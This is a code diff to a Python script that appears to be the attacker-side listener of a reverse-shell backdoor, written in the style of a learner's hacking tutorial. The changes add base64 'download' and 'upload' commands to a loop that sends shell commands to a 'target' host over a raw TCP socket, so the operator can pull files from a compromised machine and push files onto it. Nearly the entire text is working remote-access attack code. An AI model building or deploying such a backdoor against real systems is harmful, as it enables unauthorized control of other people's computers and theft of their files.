@@ -1,6 +1,7 @@
 #!/usr/bin/python
 import socket
 import json # use this inorder to dump the data as bytes as it can
+import base64
 
 
 # we gonna send send and receive data as wew want ==
@@ -18,7 +19,7 @@ def reliable_rcv():
 			# print("testing the json data receving: " + json_data)
 			# print("print the json loads: "+ json.loads(json_data))
 			return json.loads(json_data)
-		except ValueError:
+		except :
 			# print("reliable_rcv except (continue)..")
 			continue
 
@@ -34,13 +35,28 @@ def shell():
 			break
 		elif command[:2] == "cd" and len(command) > 1:
 			continue
+		elif command[:8] == "download":
+                        # file = open(command[9:], "wb")  # you can this also
+                        with open(command[9:], "wb") as file:
+                                result = reliable_rcv()
+                                # in order to not crash our file wee need to use base64
+                                file.write(base64.b64decode(result))
+		elif command[:6] == "upload":
+			try:
+				with open(command[7:], "rb") as fin:
+					reliable_send(base64.b64encode(fin.read()))
+			except:
+				failed = "failed to upload"
+				reliable_send(base64.b64encode(failed))
 		else:
 			result = reliable_rcv() #  receive bytes
 			print(result)
 
 
 def server():
-	global s, ip, target
+	global s
+	global ip
+	global target
 	# create simple connection
 	# ipv4 run over tcp
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
